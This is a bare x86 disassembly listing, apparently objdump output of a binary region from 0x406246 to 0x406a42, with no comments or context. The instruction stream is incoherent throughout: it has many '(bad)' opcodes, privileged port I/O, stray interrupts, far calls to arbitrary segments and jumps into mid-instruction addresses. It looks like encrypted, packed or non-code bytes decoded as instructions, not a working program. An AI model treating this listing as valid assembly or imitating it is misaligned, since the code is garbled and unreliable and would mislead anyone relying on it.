  406246:	leave  
  406247:	int3   
  406248:	add    eax,DWORD PTR [esi+0x75fd002f]
  40624e:	push   esp
  40624f:	and    al,0x91
  406251:	repnz sbb bh,dh
  406254:	loopne 0x40621d
  406256:	push   cs
  406257:	in     eax,dx
  406258:	jne    0x406254
  40625a:	or     DWORD PTR [ecx],esp
  40625c:	imul   edi,DWORD PTR [ebx],0x29
  40625f:	sbb    BYTE PTR [ecx+edx*2+0x5a02a4f4],al
  406266:	and    al,0xb6
  406268:	loopne 0x4062db
  40626a:	inc    edx
  40626b:	cmp    eax,0x3282c7f3
  406270:	xchg   edi,eax
  406271:	push   DWORD PTR [esi]
  406273:	rcl    DWORD PTR [ebp-0x1e],0xf6
  406277:	jo     0x406257
  406279:	stos   BYTE PTR es:[edi],al
  40627a:	test   BYTE PTR [eax-0x36a70eac],ah
  406280:	or     eax,0xa4424311
  406285:	adc    edx,esi
  406287:	inc    esi
  406288:	shr    BYTE PTR [ebx+0x1],0x68
  40628c:	or     DWORD PTR [ebx],eax
  40628e:	mov    bl,0xf8
  406290:	mov    ebp,0xa357c70a
  406295:	add    eax,0xc068fbe3
  40629a:	out    dx,eax
  40629b:	jmp    0x4062f7
  40629d:	in     al,dx
  40629e:	mov    DWORD PTR [edi+0x73e989d9],edx
  4062a4:	add    ch,BYTE PTR [ecx]
  4062a6:	mov    dl,0x97
  4062a8:	push   ebx
  4062a9:	cmp    edi,ebp
  4062ab:	adc    ah,al
  4062ad:	pop    edi
  4062ae:	jne    0x156321c4
  4062b4:	iret   
  4062b5:	xor    al,0x9
  4062b7:	(bad)  
  4062b9:	cmp    eax,0x9d9d2e0e
  4062be:	xlat   BYTE PTR ds:[ebx]
  4062bf:	push   0x48
  4062c1:	in     al,dx
  4062c2:	(bad)  
  4062c4:	sahf   
  4062c5:	fstp   TBYTE PTR [esi-0x65149dc7]
  4062cb:	push   es
  4062cc:	adc    DWORD PTR [edi+eiz*4-0x2],0x54
  4062d1:	rep lods al,BYTE PTR ds:[esi]
  4062d3:	cwde   
  4062d4:	pop    es
  4062d5:	sbb    DWORD PTR [ecx],ebp
  4062d7:	pushf  
  4062d8:	xlat   BYTE PTR ds:[ebx]
  4062d9:	les    edx,FWORD PTR [ecx+ebx*1-0x69]
  4062dd:	loop   0x406276
  4062df:	sub    cl,BYTE PTR [edi]
  4062e1:	dec    edx
  4062e2:	ret    
  4062e3:	mov    eax,0x3c924f4d
  4062e8:	mov    WORD PTR [ebx-0x4a6f895a],gs
  4062ee:	pop    eax
  4062ef:	in     al,0x3a
  4062f1:	pop    es
  4062f2:	jb     0x406279
  4062f4:	jo     0x4062d5
  4062f6:	jns    0x4062d1
  4062f8:	fcmove st,st(3)
  4062fa:	(bad)  
  4062fb:	push   esi
  4062fc:	repz sub bh,BYTE PTR [ebp+0x6ec697b1]
  406303:	xchg   esi,eax
  406304:	mov    eax,ds:0xf61ab42c
  406309:	lods   al,BYTE PTR ds:[esi]
  40630a:	xor    edx,DWORD PTR [eax+0x56d7fb91]
  406310:	xor    ebp,ebp
  406312:	xor    ah,BYTE PTR [esi]
  406314:	jge    0x4062d2
  406316:	ficom  DWORD PTR [edx+esi*2+0x1051d16a]
  40631d:	arpl   WORD PTR fs:[edx-0x2e47915d],dx
  406324:	jmp    0x40632a
  406326:	pusha  
  406327:	rcl    DWORD PTR [ecx-0x6b],0x38
  40632b:	dec    edx
  40632c:	xor    eax,0xa037e161
  406331:	lock rol DWORD PTR [edi+edx*4],0x4
  406336:	mov    ebx,0x72748cf
  40633b:	mov    eax,ds:0xa6b88a63
  406340:	cmc    
  406341:	or     DWORD PTR [esi-0x360ea183],esp
  406347:	add    eax,0x41c43236
  40634c:	and    DWORD PTR [ebp-0x60bba45d],ecx
  406352:	dec    edi
  406353:	jle    0x4063b5
  406355:	pop    esp
  406356:	loop   0x4063aa
  406358:	into   
  406359:	push   ebx
  40635a:	cli    
  40635b:	add    DWORD PTR [ecx-0x9],ebx
  40635e:	push   0xffffffdd
  406360:	push   esi
  406361:	into   
  406362:	jbe    0x4062ef
  406364:	mov    eax,ds:0xbd081ddc
  406369:	push   0xffffff9e
  40636b:	add    eax,0x3453fed4
  406370:	pop    eax
  406371:	int    0xaf
  406373:	cmp    eax,0xf9c96aa1
  406378:	sub    esp,DWORD PTR [eax+0x58c214ec]
  40637e:	push   edx
  40637f:	xchg   edx,edx
  406381:	daa    
  406382:	icebp  
  406383:	mov    ds:0x642a6d92,al
  406388:	ror    BYTE PTR [ebp+0x28],cl
  40638b:	mov    eax,0x962b6aa0
  406390:	ss lock pusha 
  406393:	jmp    0x2439ac0e
  406398:	pop    edi
  406399:	cwde   
  40639a:	dec    edi
  40639b:	fdivr  QWORD PTR [ebp-0x16]
  40639e:	sbb    edi,esp
  4063a0:	inc    edx
  4063a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063a2:	stos   BYTE PTR es:[edi],al
  4063a3:	fst    QWORD PTR [esi+0x27]
  4063a6:	jnp    0x4063b8
  4063a8:	or     DWORD PTR [edx-0x52],0xfffffff0
  4063ac:	xchg   edi,eax
  4063ad:	dec    ebx
  4063ae:	push   edi
  4063af:	icebp  
  4063b0:	adc    dl,ah
  4063b2:	je     0x4063c3
  4063b4:	cmp    BYTE PTR [eax+0x5dbd662c],ch
  4063ba:	push   0x9c2eddf5
  4063bf:	jg     0x40638b
  4063c1:	jmp    0x3c4d77c4
  4063c6:	neg    DWORD PTR [ebx+0x4533caac]
  4063cc:	ret    0xc838
  4063cf:	(bad)  
  4063d0:	jmp    DWORD PTR [edi-0x1e]
  4063d3:	xor    BYTE PTR [eax+ecx*2+0x67],al
  4063d7:	push   edi
  4063d8:	dec    ebp
  4063d9:	aas    
  4063da:	push   ss
  4063db:	push   edx
  4063dc:	dec    ebx
  4063dd:	ret    
  4063de:	inc    BYTE PTR [ecx-0x56a514cf]
  4063e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e5:	cmp    bh,dh
  4063e7:	aam    0x54
  4063e9:	push   ecx
  4063ea:	retf   0x49e3
  4063ed:	inc    ecx
  4063ee:	repz and BYTE PTR [edx-0x1f4414a6],dl
  4063f5:	ret    0x4d5c
  4063f8:	or     eax,0xdbe4712a
  4063fd:	add    BYTE PTR ds:0xaed7ad76,ch
  406403:	(bad)  
  406404:	dec    esp
  406405:	push   0x3821562b
  40640a:	mov    DWORD PTR [edi*8+0x383ba823],esi
  406411:	retf   
  406412:	aad    0xed
  406414:	call   0x1680:0x910fc379
  40641b:	(bad)  
  40641c:	icebp  
  40641d:	cld    
  40641e:	pop    ss
  40641f:	dec    ecx
  406420:	inc    esp
  406421:	jno    0x406460
  406423:	mov    edx,0x8ea44dd8
  406428:	sub    BYTE PTR [edi-0x40],0xf0
  40642c:	in     al,dx
  40642d:	stos   BYTE PTR es:[edi],al
  40642e:	jp     0x40643b
  406430:	jg     0x406442
  406432:	add    al,0x9f
  406434:	jle    0x4063dd
  406436:	dec    ecx
  406437:	add    eax,0x2f6abc58
  40643c:	xchg   edi,eax
  40643d:	jnp    0x406448
  40643f:	sbb    BYTE PTR [edx],0xa6
  406442:	icebp  
  406443:	stc    
  406444:	push   edx
  406445:	jb     0x4063f6
  406447:	jp     0x4064a2
  406449:	outs   dx,DWORD PTR ds:[esi]
  40644a:	loop   0x406435
  40644c:	inc    ebp
  40644d:	xor    eax,0xb8cc4eec
  406452:	rcr    BYTE PTR [ebx-0x26],0x3e
  406456:	test   al,0x1b
  406458:	jmp    0x4493:0x750810f6
  40645f:	imul   esp,DWORD PTR [ecx+0x20f21af4],0xffffffd3
  406466:	call   0xb94799e2
  40646b:	xchg   ah,ch
  40646d:	shl    bl,0xcf
  406470:	and    ebx,DWORD PTR [esi+0x16416810]
  406476:	ret    0xe94
  406479:	lods   ax,WORD PTR ds:[esi]
  40647b:	jmp    0x4064f3
  40647d:	mov    es:0x6fb61a2c,al
  406483:	mov    edi,0x8d42682c
  406488:	scas   eax,DWORD PTR es:[edi]
  406489:	push   ds
  40648a:	nop
  40648b:	or     esi,0xf7d1872f
  406491:	dec    edi
  406492:	mov    ebx,DWORD PTR [esi+0x6c5d89b4]
  406498:	jo     0x406497
  40649a:	into   
  40649b:	jae    0x4064da
  40649d:	aad    0xd
  40649f:	jno    0x40643c
  4064a1:	xchg   esp,eax
  4064a2:	adc    BYTE PTR [edi+0x30],cl
  4064a5:	cmp    bl,BYTE PTR [esi]
  4064a7:	jns    0x40643f
  4064a9:	fisub  DWORD PTR [ecx]
  4064ab:	outs   dx,DWORD PTR ds:[esi]
  4064ac:	sub    DWORD PTR [eax+ebx*4-0x7b1102bb],ecx
  4064b3:	loop   0x4064d8
  4064b5:	mov    bl,0x13
  4064b7:	pop    es
  4064b8:	sbb    ch,bh
  4064ba:	jmp    0x2ac162d8
  4064bf:	inc    ecx
  4064c0:	inc    ebp
  4064c1:	mov    bh,0xfd
  4064c3:	sub    ecx,DWORD PTR [ebx]
  4064c5:	nop
  4064c6:	adc    al,0x19
  4064c8:	add    al,0xb9
  4064ca:	mov    dh,BYTE PTR [edi]
  4064cc:	jmp    0x5cac8df
  4064d1:	pop    edx
  4064d2:	sub    dh,bl
  4064d4:	repz repz jl 0x4064ae
  4064d8:	addr16 add eax,0x24e3488e
  4064de:	fdivr  st(6),st
  4064e0:	push   0x22305200
  4064e5:	jmp    0x642d:0xa059762b
  4064ec:	cmc    
  4064ed:	setne  BYTE PTR [esi-0x2]
  4064f1:	sbb    DWORD PTR [eax-0x11],edi
  4064f4:	mov    ds:0x65fc14e3,al
  4064f9:	out    0x42,eax
  4064fb:	loope  0x406579
  4064fd:	popa   
  4064fe:	inc    ebx
  4064ff:	into   
  406500:	xlat   BYTE PTR ds:[ebx]
  406501:	pushf  
  406502:	std    
  406503:	sti    
  406504:	popf   
  406505:	(bad)  
  406506:	fild   QWORD PTR [edx+0x11]
  406509:	push   edi
  40650a:	or     BYTE PTR [esi+0x21add7c5],al
  406510:	(bad)  
  406511:	test   BYTE PTR [edx+0x1f80d262],0x52
  406518:	push   es
  406519:	scas   al,BYTE PTR es:[edi]
  40651a:	xor    al,0xca
  40651c:	inc    edx
  40651d:	loop   0x406577
  40651f:	adc    al,0xe3
  406521:	imul   edx,DWORD PTR [ecx-0x3e],0xfb8340d5
  406528:	inc    ebp
  406529:	dec    edi
  40652a:	retf   
  40652b:	and    ah,BYTE PTR [eax]
  40652d:	sbb    DWORD PTR [edi+ebp*4],0x62243511
  406534:	mov    ?,WORD PTR [esi]
  406536:	(bad)  
  406537:	xchg   esi,eax
  406538:	gs cdq 
  40653a:	stc    
  40653b:	sar    BYTE PTR [edx],cl
  40653d:	mov    bh,0x57
  40653f:	sub    al,0x52
  406541:	test   DWORD PTR [edi],ecx
  406543:	adc    ah,BYTE PTR [ebp-0x7]
  406546:	cmc    
  406547:	jo     0x4065ac
  406549:	xchg   edi,eax
  40654a:	ror    DWORD PTR [esp+edi*1],1
  40654d:	inc    edi
  40654e:	sub    DWORD PTR [eax],0xfbd3fa06
  406554:	dec    esi
  406555:	mov    eax,0xc6a556ce
  40655a:	cmp    eax,0x8e327381
  40655f:	mov    dh,0x3c
  406561:	adc    BYTE PTR es:[ebx-0x430e6129],dh
  406568:	fist   DWORD PTR [esi]
  40656a:	ss pop ss
  40656c:	fwait
  40656d:	shl    BYTE PTR [ecx+0x3],1
  406570:	iret   
  406571:	inc    edx
  406572:	test   BYTE PTR [edi-0x1e],cl
  406575:	xor    dl,dl
  406577:	fs jae 0x4065ca
  40657a:	addr16 mov bh,0x94
  40657d:	jg     0x40651e
  40657f:	mov    ah,0x22
  406581:	ficom  DWORD PTR [edx]
  406583:	adc    BYTE PTR [eax],dl
  406585:	jle    0x4065d2
  406587:	xchg   DWORD PTR [ecx-0x216c131b],ebx
  40658d:	daa    
  40658e:	mov    bh,0x15
  406590:	cld    
  406591:	mov    ds:0xee72c53c,eax
  406596:	sub    ebx,edx
  406598:	daa    
  406599:	in     eax,0xf7
  40659b:	addr16 ret 0x5174
  40659f:	inc    edi
  4065a0:	jge    0x4065e0
  4065a2:	dec    esp
  4065a3:	hlt    
  4065a4:	arpl   WORD PTR [eax-0x32],bp
  4065a7:	inc    esp
  4065a8:	dec    esi
  4065a9:	sbb    DWORD PTR [eax],edx
  4065ab:	imul   edx,DWORD PTR [eax-0x3cb650af],0x1b
  4065b2:	push   0x1e486f51
  4065b7:	xchg   ebp,eax
  4065b8:	jle    0x4065cf
  4065ba:	lods   al,BYTE PTR ds:[esi]
  4065bb:	inc    edx
  4065bc:	xchg   bl,ch
  4065be:	jnp    0x406555
  4065c0:	js     0x406565
  4065c2:	stc    
  4065c3:	dec    ecx
  4065c4:	add    ah,ch
  4065c6:	sahf   
  4065c7:	xchg   ebp,eax
  4065c8:	sahf   
  4065c9:	les    edx,FWORD PTR [eax-0x4e]
  4065cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065cd:	lea    esp,[ebp+edi*8-0x28]
  4065d1:	outs   dx,BYTE PTR ds:[esi]
  4065d2:	inc    eax
  4065d3:	cld    
  4065d4:	add    esp,0x7a
  4065d7:	mov    al,0xd7
  4065d9:	mov    al,ds:0x74d39727
  4065de:	add    bh,BYTE PTR [edi+0x35eee1c9]
  4065e4:	out    0xf1,eax
  4065e6:	pop    ebp
  4065e7:	pop    ebp
  4065e8:	loop   0x406642
  4065ea:	mov    dh,0x73
  4065ec:	fwait
  4065ed:	dec    edx
  4065ee:	inc    edi
  4065ef:	jge    0x4065a4
  4065f1:	ins    DWORD PTR es:[edi],dx
  4065f2:	in     eax,0x44
  4065f4:	mov    edx,ebx
  4065f6:	sub    eax,0x6ab5a2b6
  4065fb:	loop   0x4065b3
  4065fd:	lock out dx,eax
  4065ff:	in     eax,0xce
  406601:	mov    dl,0x5b
  406603:	xchg   ebx,eax
  406604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406605:	jo     0x4065c9
  406607:	test   DWORD PTR [edx-0x7076e0d1],edi
  40660d:	dec    edx
  40660e:	xor    BYTE PTR [ebp+0x1d],bl
  406611:	pop    eax
  406612:	adc    eax,0xf39c9b17
  406617:	pop    ss
  406618:	fldenv [ebp-0x11cdddb0]
  40661e:	imul   edx,edx,0x11
  406621:	and    dl,dh
  406623:	test   DWORD PTR [ecx+0x48],0x6c99245
  40662a:	test   BYTE PTR [eax-0x3e30864d],cl
  406630:	jp     0x40661c
  406632:	and    edx,DWORD PTR [eiz*2-0x2adbc078]
  406639:	enter  0xf907,0xe3
  40663d:	imul   ebp,edi,0xa16dbfdc
  406643:	dec    esi
  406644:	mov    esp,0x7cb5ea50
  406649:	mov    ch,0xf1
  40664b:	(bad)  
  40664c:	mov    bl,0xd5
  40664e:	cs jns 0x406619
  406651:	adc    eax,0x7a24bece
  406656:	dec    ebx
  406657:	fwait
  406658:	ds gs sbb al,0x50
  40665c:	(bad)  
  40665d:	std    
  40665e:	adc    dh,BYTE PTR [esi]
  406660:	cmp    eax,0x75da66a5
  406665:	sbb    esp,DWORD PTR [edi-0x66698cfa]
  40666b:	scas   al,BYTE PTR es:[edi]
  40666c:	jo     0x406645
  40666e:	bound  eax,QWORD PTR [esp+edx*8]
  406671:	pusha  
  406672:	push   cs
  406673:	shl    DWORD PTR [edi],0xae
  406676:	xchg   di,ax
  406678:	adc    al,0xdb
  40667a:	arpl   WORD PTR [esi],sp
  40667c:	test   al,0x49
  40667e:	outs   dx,BYTE PTR ds:[esi]
  40667f:	mul    ch
  406681:	push   0xb
  406683:	or     esp,edx
  406685:	call   0x23d5:0x69a99966
  40668c:	(bad)  
  40668d:	out    0x3c,al
  40668f:	push   ebx
  406690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406691:	cdq    
  406692:	pop    ss
  406693:	cwde   
  406694:	xor    DWORD PTR [esi],eax
  406696:	pop    edi
  406697:	sbb    bh,BYTE PTR [edx]
  406699:	and    eax,0x951a59ac
  40669e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40669f:	(bad)  
  4066a0:	outs   dx,DWORD PTR ds:[esi]
  4066a1:	stc    
  4066a2:	into   
  4066a3:	scas   eax,DWORD PTR es:[edi]
  4066a4:	inc    ebx
  4066a5:	mov    ah,al
  4066a7:	push   es
  4066a8:	mov    cl,0x4f
  4066aa:	jp     0x4066e3
  4066ac:	lahf   
  4066ad:	lods   eax,DWORD PTR ss:[si]
  4066b0:	fwait
  4066b1:	std    
  4066b2:	sbb    edx,DWORD PTR [eax]
  4066b4:	rcl    bh,0xfa
  4066b7:	push   ecx
  4066b8:	out    dx,eax
  4066b9:	(bad)  
  4066ba:	jl     0x406646
  4066bc:	es push es
  4066be:	test   eax,0xc7f75ec8
  4066c3:	aaa    
  4066c4:	mov    ebx,0x29ad0dff
  4066c9:	push   ds
  4066ca:	push   0x7b
  4066cc:	mov    ecx,0x374b0f1a
  4066d1:	scas   eax,DWORD PTR es:[edi]
  4066d2:	inc    DWORD PTR [ebp+0x3f]
  4066d5:	push   es
  4066d6:	cmp    ah,BYTE PTR [eax]
  4066d8:	push   ds
  4066d9:	out    dx,eax
  4066da:	sub    esi,DWORD PTR [ecx]
  4066dc:	dec    eax
  4066dd:	xchg   ecx,eax
  4066de:	dec    edx
  4066df:	aad    0xe8
  4066e1:	sahf   
  4066e2:	jmp    0x406761
  4066e4:	out    0x10,al
  4066e6:	call   0x69545e6
  4066eb:	jle    0x4066df
  4066ed:	push   ecx
  4066ee:	jbe    0x4066c3
  4066f0:	rol    bl,1
  4066f2:	fistp  DWORD PTR [eax-0x5ff3660d]
  4066f8:	jns    0x406735
  4066fa:	mov    ecx,0xa0c390f5
  4066ff:	sbb    ebp,eax
  406701:	adc    al,0x21
  406703:	fwait
  406704:	aad    0x30
  406706:	adc    al,0x68
  406708:	or     edi,DWORD PTR [ebp+0xa45a161]
  40670e:	jp     0x40676e
  406710:	adc    BYTE PTR [eax+0x3a],cl
  406713:	jg     0x406744
  406715:	js     0x406746
  406717:	cmp    eax,DWORD PTR [edx]
  406719:	jmp    0xd1a42b95
  40671e:	hlt    
  40671f:	shr    DWORD PTR [ebx],0x7b
  406722:	mov    ds:0x1bc67241,eax
  406727:	inc    edx
  406728:	es mov ebp,0x2facf331
  40672e:	mov    edx,0xd7b17c4f
  406733:	retf   0x9306
  406736:	jbe    0x4066ba
  406738:	adc    esp,DWORD PTR [edi+0x714d1430]
  40673e:	clc    
  40673f:	fdivr  st(2),st
  406741:	aaa    
  406742:	mov    dh,BYTE PTR [edi+ebp*1-0x41]
  406746:	ins    DWORD PTR es:[edi],dx
  406747:	pop    es
  406748:	or     eax,0xb002f3e6
  40674d:	rcr    cl,cl
  40674f:	lds    ebx,FWORD PTR gs:[ebx+0x472cd6d7]
  406756:	push   ebx
  406757:	jmp    0x4a1b6fab
  40675c:	pop    esi
  40675d:	shl    BYTE PTR [edi+0x281f50c3],1
  406763:	pop    edi
  406764:	push   cs
  406765:	loop   0x4067a5
  406767:	jb     0x4066eb
  406769:	packsswb mm1,QWORD PTR [eax]
  40676c:	inc    esi
  40676d:	xor    eax,0x276b68c8
  406772:	xchg   ebx,eax
  406773:	dec    ebp
  406774:	fist   DWORD PTR [ebx]
  406776:	movups xmm2,XMMWORD PTR [ecx-0x19]
  40677a:	sub    al,0x96
  40677c:	aam    0x2f
  40677e:	jecxz  0x4067fc
  406780:	cs jge 0x406708
  406783:	mov    ecx,0x760198ff
  406788:	pop    ebx
  406789:	pop    edi
  40678a:	or     DWORD PTR [eax],ebp
  40678c:	pop    ebp
  40678d:	out    0xab,eax
  40678f:	es push esp
  406791:	mov    ecx,0x707ea187
  406796:	js     0x40675d
  406798:	xchg   bp,ax
  40679a:	and    BYTE PTR [ecx-0x30d877fa],bl
  4067a0:	mov    ebx,0x2eae070c
  4067a5:	test   eax,0x36778f45
  4067aa:	retf   0x5fa9
  4067ad:	inc    edx
  4067ae:	push   ebp
  4067af:	xor    cl,BYTE PTR [ecx]
  4067b1:	mov    esi,0x94371625
  4067b6:	xchg   ecx,eax
  4067b7:	addr16 repnz mov ch,dl
  4067bb:	retf   0xf41a
  4067be:	dec    esp
  4067bf:	in     al,dx
  4067c0:	fld    TBYTE PTR [eax-0x7817e6d5]
  4067c6:	outs   dx,DWORD PTR ds:[esi]
  4067c7:	mov    esp,0xad374088
  4067cc:	and    BYTE PTR [edx],dl
  4067ce:	stos   DWORD PTR es:[edi],eax
  4067cf:	xchg   edx,eax
  4067d0:	in     eax,dx
  4067d1:	push   cs
  4067d2:	int    0xe4
  4067d4:	ror    DWORD PTR [edi+0x19],0xf4
  4067d8:	out    dx,al
  4067d9:	xchg   ebx,eax
  4067da:	mov    dh,BYTE PTR [edx]
  4067dc:	rcr    ebp,0x0
  4067df:	xor    eax,0xd23f6b4
  4067e4:	jl     0x4067a1
  4067e6:	push   ebp
  4067e7:	xchg   BYTE PTR [edi-0x6ce521a8],ah
  4067ed:	and    BYTE PTR [eax+0x1c],bl
  4067f0:	cmp    eax,0xd7bf20c1
  4067f5:	dec    esi
  4067f6:	xor    eax,0x40328d3b
  4067fb:	retf   0xa4b5
  4067fe:	or     ch,bl
  406800:	mov    bh,BYTE PTR [eax+0x1092920]
  406806:	std    
  406807:	popa   
  406808:	retf   
  406809:	in     al,0xa5
  40680b:	sbb    edi,DWORD PTR [esi-0x224795cb]
  406811:	ret    
  406812:	repnz into 
  406814:	push   cs
  406815:	jbe    0x406883
  406817:	push   edx
  406818:	imul   DWORD PTR ds:0xd94a24ee
  40681e:	fwait
  40681f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406820:	mov    eax,ds:0xa77866ab
  406825:	mov    BYTE PTR [ebp+0x5f7242e9],0x40
  40682c:	fbstp  TBYTE PTR [ebp-0x5e]
  40682f:	dec    ebx
  406830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406831:	cmp    al,0x87
  406833:	int    0xdc
  406835:	jmp    0x4068a7
  406837:	dec    ebx
  406838:	mov    ebx,0x540778a1
  40683d:	mov    dl,0x3c
  40683f:	imul   eax,DWORD PTR [esi],0xffffffb7
  406842:	add    edi,edx
  406844:	(bad)  
  406845:	dec    ecx
  406846:	sbb    dl,BYTE PTR [eax+0x7103da40]
  40684c:	sbb    ch,BYTE PTR ss:[edi]
  40684f:	mov    cl,0xa8
  406851:	jle    0x406860
  406853:	push   esp
  406854:	pop    ss
  406855:	iret   
  406856:	shl    dh,0x78
  406859:	jmp    0x4ce5:0x1e79f0ae
  406860:	sub    eax,0x9d60327f
  406865:	dec    esp
  406866:	pop    ebx
  406867:	ja     0x406847
  406869:	popf   
  40686a:	shl    cl,cl
  40686c:	mov    dh,0xbb
  40686e:	jg     0x4068d6
  406870:	sbb    al,0xad
  406872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406873:	rcr    DWORD PTR [eax-0x4c],1
  406876:	adc    bh,cl
  406878:	jo     0x406898
  40687a:	out    0xd9,al
  40687c:	ja     0x40683f
  40687e:	push   ebp
  40687f:	sar    DWORD PTR [ebx],0xc8
  406882:	loopne 0x406842
  406884:	jno    0x4068ae
  406886:	mov    DWORD PTR [edi-0x4c12580f],esi
  40688c:	dec    ecx
  40688d:	daa    
  40688e:	xchg   ecx,eax
  40688f:	inc    ecx
  406890:	dec    ebx
  406891:	pop    esp
  406892:	(bad)  
  406893:	cmp    al,0x97
  406895:	pusha  
  406896:	push   ebp
  406897:	mov    esi,esp
  406899:	add    BYTE PTR [edi-0x23],al
  40689c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40689d:	out    dx,eax
  40689e:	xor    al,0xad
  4068a0:	pop    esp
  4068a1:	jae    0x4068f0
  4068a3:	mov    ecx,0x7ebf19c
  4068a8:	xor    ch,ch
  4068aa:	push   ebx
  4068ab:	cmp    al,0x87
  4068ad:	inc    edi
  4068ae:	out    0xa3,eax
  4068b0:	iret   
  4068b1:	sbb    BYTE PTR [eax],bl
  4068b3:	repz pop esp
  4068b5:	jnp    0x4068f4
  4068b7:	stc    
  4068b8:	mov    eax,0xc1529fee
  4068bd:	je     0x406874
  4068bf:	inc    edx
  4068c0:	sahf   
  4068c1:	shr    BYTE PTR ds:0x62342074,cl
  4068c7:	cmp    edi,esp
  4068c9:	mov    esi,0xddad7244
  4068ce:	jno    0x4068f0
  4068d0:	xor    cl,cl
  4068d2:	and    BYTE PTR ds:0x8fc3b8f7,al
  4068d8:	pop    es
  4068d9:	push   ebp
  4068da:	(bad)  
  4068db:	jg     0x40686b
  4068dd:	loopne 0x406885
  4068df:	dec    esi
  4068e0:	and    al,0xa9
  4068e2:	or     eax,0x2bb648b2
  4068e7:	and    eax,0x74c4f98
  4068ec:	jae    0x406917
  4068ee:	mov    dh,0x3
  4068f0:	or     eax,0x95a5f8cf
  4068f5:	dec    ebx
  4068f6:	and    BYTE PTR [ebx],cl
  4068f8:	mov    eax,fs
  4068fa:	mov    esp,0xb11f5e6a
  4068ff:	jge    0x406908
  406901:	dec    eax
  406902:	adc    esp,eax
  406904:	mov    edi,0x99d6250a
  406909:	dec    ebp
  40690a:	pop    ebp
  40690b:	and    DWORD PTR [ebp+0x30920338],0xffffffb6
  406912:	cmp    eax,0xb418eb68
  406917:	mov    DWORD PTR [esi+0x1b],ebx
  40691a:	mov    al,ds:0x138796a3
  40691f:	out    dx,al
  406920:	adc    al,0x39
  406922:	lahf   
  406923:	sar    BYTE PTR [ebx-0x5e63c70],cl
  406929:	(bad)  
  40692a:	adc    eax,0x3817cf24
  40692f:	dec    eax
  406930:	fld    DWORD PTR [ebx+0x45]
  406933:	out    dx,eax
  406934:	pop    ds
  406935:	or     dl,BYTE PTR [edi]
  406937:	xchg   edx,edx
  406939:	push   edi
  40693a:	jae    0x406968
  40693c:	ja     0x40697c
  40693e:	(bad)  
  40693f:	fwait
  406940:	and    edx,DWORD PTR [eax-0x936b382]
  406946:	inc    ebx
  406947:	call   0x9211105c
  40694c:	loope  0x406966
  40694e:	mov    eax,0x202d8c12
  406953:	push   ecx
  406954:	pop    esp
  406955:	repz sbb dh,BYTE PTR [ecx-0x55a8aec0]
  40695c:	sub    al,0xd4
  40695e:	jle    0x40698a
  406960:	mov    esi,DWORD PTR gs:[ebp*8+0x56e4808]
  406968:	fisub  DWORD PTR [eax]
  40696a:	repz inc eax
  40696c:	xchg   ebp,eax
  40696d:	xchg   edi,eax
  40696e:	scas   al,BYTE PTR es:[edi]
  40696f:	push   0x22
  406971:	imul   edx,DWORD PTR [ebx+0x7d],0x6c
  406975:	cwde   
  406976:	cmp    dl,BYTE PTR [ecx+0x76]
  406979:	jne    0x40698f
  40697b:	frstor [ecx+0xc]
  40697e:	(bad)  
  40697f:	dec    ebx
  406980:	xchg   ah,bl
  406982:	pushf  
  406983:	xchg   ecx,eax
  406984:	or     edi,edi
  406986:	lds    ebx,FWORD PTR [esi+0x63b0048a]
  40698c:	in     eax,0x94
  40698e:	xchg   edi,eax
  40698f:	int    0x72
  406991:	int3   
  406992:	mov    ah,0xe
  406994:	or     DWORD PTR [edi+0x4d],edi
  406997:	ret    
  406998:	and    al,0xc8
  40699a:	jmp    0x95e1:0xe029049a
  4069a1:	(bad)  
  4069a3:	in     eax,0x8e
  4069a5:	mov    edi,DWORD PTR [eax]
  4069a7:	aas    
  4069a8:	adc    esi,DWORD PTR [esi-0x36e214af]
  4069ae:	fdiv   st(0),st
  4069b0:	and    ecx,esp
  4069b2:	cmp    BYTE PTR [esi-0x1d65045c],dh
  4069b8:	push   ecx
  4069b9:	mov    eax,ds:0x3c296a43
  4069be:	adc    BYTE PTR [ebx+0x3797d2ed],bl
  4069c4:	or     esi,DWORD PTR [edi+0x24c86069]
  4069ca:	(bad)  
  4069cb:	stos   DWORD PTR es:[edi],eax
  4069cc:	mov    dh,0xf1
  4069ce:	bound  eax,QWORD PTR [edi]
  4069d0:	xchg   DWORD PTR [ecx+0x423dab3f],esp
  4069d6:	outs   dx,BYTE PTR ds:[esi]
  4069d7:	fdiv   DWORD PTR [ebp+0x5f]
  4069da:	mov    cl,0xd3
  4069dc:	mov    WORD PTR [edi],gs
  4069de:	stc    
  4069df:	sbb    BYTE PTR [ebx-0x6f292c5a],bh
  4069e5:	push   edx
  4069e6:	mov    eax,ebp
  4069e8:	int3   
  4069e9:	mov    ecx,0x72398a21
  4069ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ef:	and    DWORD PTR [edi],ebx
  4069f1:	iret   
  4069f2:	icebp  
  4069f3:	adc    dh,BYTE PTR [ecx+eiz*1]
  4069f6:	ds retf 
  4069f8:	pusha  
  4069f9:	cwde   
  4069fa:	mov    ah,0x60
  4069fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069fd:	dec    ebx
  4069fe:	sbb    BYTE PTR [ebx+0x6f8340ec],ch
  406a04:	mov    ch,0xb3
  406a06:	aas    
  406a07:	test   al,0xe3
  406a09:	jae    0x406a03
  406a0b:	sub    al,0x6b
  406a0d:	mov    bh,0xef
  406a0f:	ror    ebx,0xa5
  406a12:	jno    0x4069a9
  406a14:	aad    0x87
  406a16:	pusha  
  406a17:	sbb    BYTE PTR [ebx],ch
  406a19:	daa    
  406a1a:	pop    esi
  406a1b:	bnd call 0x71d256c3
  406a21:	test   eax,0x99ed4f83
  406a26:	cmp    edi,ebx
  406a28:	mov    bl,0xbf
  406a2a:	fadd   QWORD PTR [esi]
  406a2c:	test   eax,0xf7c15f4c
  406a31:	retf   0x5a83
  406a34:	adc    bh,BYTE PTR [edi+0x70b1bc0c]
  406a3a:	xor    eax,0xd54c965c
  406a3f:	iret   
  406a40:	loopne 0x406ab7
  406a42:	lea    edx,[edi]
